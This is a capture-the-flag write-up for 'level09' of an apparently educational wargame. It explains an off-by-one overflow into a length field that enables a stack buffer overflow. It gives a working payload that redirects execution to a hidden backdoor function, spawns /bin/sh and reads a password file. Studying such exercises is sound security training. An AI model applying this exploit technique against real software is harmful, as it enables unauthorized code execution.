# level09

This program revolves around the following structure:

```c
typedef struct msg {
    char content[140];
    char username[40];
    int len;
} msg_t;
```

The function `set_username` seems mostly secure, but has a subtle bug:

```c
for (int i = 0; i < 41 && buf[i] != '\0'; i++) {
    m->username[i] = buf[i];
}
```

Here, `m->username` is only 40 bytes long, but the loop allows writing up to 41 bytes, resulting in a 1-byte overflow into the adjacent field `m->len`.

This is critical, because `m->len` is later used in `set_msg`:

```c
fgets(buf, 1024, stdin);
strncpy(m->content, buf, m->len);
```

By overflowing `m->len` and setting it to `0xff` (255), we can force `strncpy` to write up to 255 bytes into `m->content`, which is only 140 bytes.

Now, we use a pattern generator to determine the offset to the return address (`RIP`):

```bash
pwndbg> r <<< $(perl -e 'print "A" x 40 . "\xff" . "\n" . "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9" . "\n"')
...
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000555555400931 in handle_msg ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
...
 RBP  0x6741356741346741 ('Ag4Ag5Ag')
 RSP  0x7fffffffd008 ◂— '6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4'
 RIP  0x555555400931 (handle_msg+113) ◂— ret
```

The program crashed, and `RBP` is overwritten with part of our pattern (`Ag4Ag5Ag`). Since `RIP` comes 8 bytes after `RBP` on the stack, we just add 8 to the offset (192).

`Offset to RIP = 192 + 8 = 200`

Next, we find the address of the hidden `secret_backdoor` function, which contains a `system` call:

```bash
(gdb) info function secret_backdoor
All functions matching regular expression "secret_backdoor":

Non-debugging symbols:
0x000055555555488c  secret_backdoor
```

We build a payload that:

- Overflows the username buffer to set `m->len = 0xff`
- Overflows content to overwrite `RIP` with the address of `secret_backdoor`
- Passes `/bin/sh` to be executed by `system`

```bash
python -c 'print("A" * 40 + "\xff\n" + 200 * "B" + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1] + "\n/bin/sh\n")'
```

And here goes the last flag:

```bash
level09@OverRide:~$ (cat <(python -c 'print("A" * 40 + "\xff\n" + 200 * "B" + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1] + "\n/bin/sh\n")') -) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat /home/users/end/.pass
<flag>
```
